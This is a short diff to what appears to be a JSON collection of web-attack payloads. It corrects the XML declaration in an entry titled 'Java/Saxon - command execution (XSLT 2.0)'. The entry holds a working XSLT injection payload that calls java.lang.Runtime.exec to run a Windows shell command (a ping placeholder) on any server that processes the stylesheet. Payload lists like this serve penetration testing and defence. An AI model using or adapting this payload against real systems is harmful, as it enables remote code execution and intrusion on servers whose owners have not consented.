@@ -112,7 +112,7 @@
       "title": "Java/Saxon - command execution (XSLT 2.0)",
       "language": "xml",
       "tags": ["rce", "java", "saxon"],
-      "body": "<xml version=\"1.0\"?>\n<xsl:stylesheet version=\"2.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:java=\"http://saxon.sf.net/java-type\">\n<xsl:template match=\"/\">\n<xsl:value-of select=\"Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')\" xmlns:Runtime=\"java:java.lang.Runtime\"/>\n</xsl:template>.\n</xsl:stylesheet>"
+      "body": "<?xml version=\"1.0\"?>\n<xsl:stylesheet version=\"2.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:java=\"http://saxon.sf.net/java-type\">\n<xsl:template match=\"/\">\n<xsl:value-of select=\"Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')\" xmlns:Runtime=\"java:java.lang.Runtime\"/>\n</xsl:template>.\n</xsl:stylesheet>"
     },
     {
       "subcategory": "RCE - .NET",
